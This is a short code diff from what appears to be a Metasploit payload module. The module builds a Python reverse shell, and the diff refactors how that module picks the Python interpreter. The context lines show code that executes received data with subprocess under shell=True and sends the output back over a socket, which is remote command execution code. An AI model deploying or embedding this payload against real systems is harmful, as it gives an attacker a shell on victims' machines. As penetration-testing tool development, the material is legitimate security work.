@@ -64,10 +64,7 @@ module MetasploitModule
     cmd += "\tproc=subprocess.Popen(data.decode('utf-8'),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n"
     cmd += "\tstdout_value=proc.stdout.read() + proc.stderr.read()\n"
     cmd += "\ts.send(stdout_value)\n"
-    if datastore['PythonPath'].nil?
-      return "echo #{Shellwords.escape(py_create_exec_stub(cmd))} | $(which python || which python3 || which python2) -"
-    else
-      return "echo #{Shellwords.escape(py_create_exec_stub(cmd))} | #{datastore['PythonPath']}  -"
-    end
+    python_path = datastore['PythonPath'].blank? ? '$(which python || which python3 || which python2)' : datastore['PythonPath']
+    "echo #{Shellwords.escape(py_create_exec_stub(cmd))} | #{python_path}"
   end
 end
